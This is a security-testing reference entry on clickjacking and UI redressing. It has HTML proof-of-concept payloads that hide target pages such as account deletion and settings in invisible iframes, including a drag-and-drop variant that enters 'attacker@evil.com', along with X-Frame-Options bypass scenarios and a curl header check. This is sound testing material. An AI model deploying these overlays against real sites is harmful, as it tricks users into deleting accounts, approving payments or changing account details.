---
id: "clickjacking"
title: "Clickjacking & UI Redressing"
type: "technique"
category: "web-application"
subcategory: "client-side"
tags: ["clickjacking", "ui-redressing", "iframe", "x-frame-options", "frame-ancestors", "likejacking", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["csrf-modern", "xss"]
difficulty: "beginner"
updated: "2026-04-14"
---

# Clickjacking & UI Redressing

## How It Works
Load the target page in a transparent iframe overlaid on attacker-controlled content. Victim thinks they're clicking the decoy but actually click the hidden target page — triggering state-changing actions.

## Basic PoC
```html
<style>
  #target { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  #decoy { position:absolute; top:470px; left:60px; z-index:1; }
</style>
<div id="decoy"><button>Click here to claim your prize!</button></div>
<iframe id="target" src="https://vulnerable-site.com/account/delete"></iframe>
```

## Multi-Step Clickjacking
```html
<!-- Two clicks: first "Delete Account", then "Confirm" -->
<div id="step1" style="position:absolute;top:330px;left:60px;">Click me first</div>
<div id="step2" style="position:absolute;top:450px;left:200px;">Now click here</div>
<iframe src="https://target.com/account/delete" style="opacity:0.0001;z-index:2;"></iframe>
```

## Drag-and-Drop Clickjacking
```html
<!-- User drags text that fills a form field on the invisible iframe -->
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','attacker@evil.com')">
  Drag this gift to the box
</div>
<iframe src="https://target.com/settings" style="opacity:0.0001;position:absolute;z-index:2;"></iframe>
```

## X-Frame-Options Bypass Scenarios
- **ALLOW-FROM** never supported in Chrome/Safari — site frameable in those browsers
- Proxy/WAF stripping the header
- CSP `frame-ancestors` overrides XFO — inconsistencies create gaps
- Some apps set XFO on login but not on sensitive action pages

## Detection
```bash
# Check for missing protections:
curl -sI https://target.com/account/settings | grep -i "x-frame-options\|frame-ancestors"
# If missing → frameable → test clickjacking
```

## Where to Find This
- Account deletion/settings pages without frame protection
- Payment/transfer confirmation pages
- OAuth authorization endpoints
- Like/Follow/Share buttons (likejacking)
- Any state-changing action that relies on CSRF tokens (clickjacking bypasses CSRF)

## Impact
- Low-Medium for non-sensitive actions
- High when chaining with account deletion, payment, or OAuth authorization
- Many programs exclude "clickjacking on pages without sensitive actions"

## Tools
- Burp Clickbandit (automatic PoC generator)
- Manual curl header checks
